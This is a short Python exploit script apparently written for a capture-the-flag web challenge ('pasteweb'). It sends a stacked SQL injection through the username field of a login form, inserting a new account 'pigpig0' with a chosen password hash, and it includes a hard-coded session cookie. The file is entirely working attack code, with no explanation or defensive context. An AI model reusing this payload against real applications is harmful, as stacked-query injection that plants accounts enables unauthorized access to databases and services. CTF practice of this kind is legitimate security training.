import requests, time, string

headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'Accept-Language': 'zh-TW,zh;q=0.8',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    'Origin': 'https://pasteweb.ctf.zoolab.org',
    'Referer': 'https://pasteweb.ctf.zoolab.org/',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Sec-GPC': '1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Brave";v="108"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

cookies = {
    'PHPSESSID': '4t1d4i796dvk3tbob44pedc69u',
}

data = {
    'username': '',
    'password': '',
    'current_time': '',
}

payload = f"""
    '; insert into pasteweb_accounts (user_account, user_password) values ('pigpig0', '1828fe7f595005e2d0db1b0bb765ed34'); --
""".strip()

data['username'] = payload
data['current_time'] = int(time.time())
response = requests.post('https://pasteweb.ctf.zoolab.org/', cookies=cookies, headers=headers, data=data)
print(response)